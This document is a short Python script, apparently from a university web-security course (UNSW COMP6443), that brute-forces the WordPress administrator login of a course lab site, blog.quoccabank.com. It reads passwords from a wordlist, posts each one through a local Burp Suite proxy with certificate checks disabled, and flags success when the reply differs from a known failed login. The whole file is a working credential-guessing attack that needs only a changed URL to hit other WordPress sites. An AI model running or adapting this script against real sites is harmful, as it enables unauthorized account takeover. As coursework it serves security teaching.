#!/usr/bin/python3

# featherbear.cc/UNSW-COMP6443
# Proxied request template
# - Useful for sending requests through a proxy, like Burp Suite

import re
import urllib
import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

pwlist = open(sys.argv[1]).read().split("\n")
proxy = {
    'https': 'http://127.0.0.1:8080',
    'http': 'http://127.0.0.1:8080'
}

params = {
        'log':'administrator',
        'pwd':'password',
        'wp-submit':'Log In',
        'redirect_to': 'https://blog.quoccabank.com/wp-admin/',
        'testcookie': 1
    }

response1 = requests.post("https://blog.quoccabank.com/wp-login.php", proxies=proxy, data=urllib.parse.urlencode(params), verify=False, headers={
        "Host" : 'blog.quoccabank.com',
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie" : 'wordpress_test_cookie=' + 'WP%20Cookie%20check'
    })

#print(response1.text)

for pw in pwlist:
    params = {
        'log':'administrator',
        'pwd':pw,
        'wp-submit':'Log In',
        'redirect_to': 'https://blog.quoccabank.com/wp-admin/',
        'testcookie': 1
    }

    response = requests.post("https://blog.quoccabank.com/wp-login.php", proxies=proxy, data=urllib.parse.urlencode(params), verify=False, headers={
            "Host" : 'blog.quoccabank.com',
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie" : 'wordpress_test_cookie=' + 'WP%20Cookie%20check'

        })


    if response1.text != response.text:
        print(f"password found: {pw}")
        break
    else:
        print(f"incorrect password: {pw}")